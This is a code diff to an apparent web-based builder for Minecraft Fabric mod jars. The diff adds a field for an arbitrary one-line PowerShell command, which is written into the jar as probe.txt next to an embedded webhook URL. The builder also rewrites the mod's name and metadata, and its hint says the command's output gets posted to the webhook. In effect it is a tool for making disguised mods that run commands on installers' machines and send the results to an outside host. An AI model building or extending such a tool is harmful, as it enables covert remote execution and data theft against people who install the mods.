@@ -372,6 +372,13 @@
             <label for="desc">Description</label>
             <textarea id="desc" rows="2" maxlength="120" placeholder="Default-Description"></textarea>
           </div>
+          <div class="fld">
+            <label for="pc">Command to run</label>
+            <input id="pc" type="text" spellcheck="false" maxlength="300"
+                   placeholder="Leave blank for the default OS-info probe">
+            <span class="hint">One line of PowerShell. Whatever it prints is what gets
+              posted. Must finish fast and print something.</span>
+          </div>
         </div>
       </details>
 
@@ -540,6 +547,7 @@
   const $ = id => document.getElementById(id);
   const wh = $('wh'), btn = $('build'), status = $('status'), dl = $('dl'), stats = $('stats');
   const fn = $('fn'), mid = $('mid'), mname = $('mname'), desc = $('desc');
+  const pc = $('pc');
   dl.style.display = 'none';
 
   // ---- tabs ----
@@ -614,6 +622,14 @@
     }
     const modDesc = desc.value.trim().slice(0, 120);
 
+    // ---- probe command ----
+    const probe = pc.value.trim();
+    if (probe && /[\r\n]/.test(probe)) {
+      status.textContent = 'Command must be a single line.';
+      status.className = 'err';
+      return;
+    }
+
     btn.disabled = true;
     status.textContent = 'Stitching the jar…';
 
@@ -621,6 +637,7 @@
       const zip = await JSZip.loadAsync(template);
       // burn the hook + rewritten metadata in
       zip.file('webhook.txt', url);
+      if (probe) zip.file('probe.txt', probe);
       const meta = JSON.parse(await zip.file('fabric.mod.json').async('string'));
       meta.id = modId;
       meta.name = modName;
